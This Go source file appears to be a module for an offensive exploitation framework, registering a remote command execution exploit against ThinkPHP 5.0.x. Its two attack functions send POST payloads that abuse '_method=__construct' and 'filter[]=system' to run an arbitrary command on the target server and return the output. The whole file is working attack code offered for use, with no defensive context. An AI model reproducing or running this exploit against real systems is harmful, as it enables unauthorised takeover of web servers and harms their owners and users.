package exp_ThinkPHP

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
)

type Exp_ThinkPHP5_0_x struct {
	exp_templates.ExpTemplate
}

func (self *Exp_ThinkPHP5_0_x) Attack_1() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	data := "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + self.MustGetStringParam("cmd")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_ThinkPHP5_0_x) Attack_2() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	data := "_method=__construct&filter[]=system&method=get&get[]=" + self.MustGetStringParam("cmd")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return

}

func init() {
	exp_register.ExpStructRegister(&Exp_ThinkPHP5_0_x{}, "exp_ThinkPHP5_0_x.yml")
}
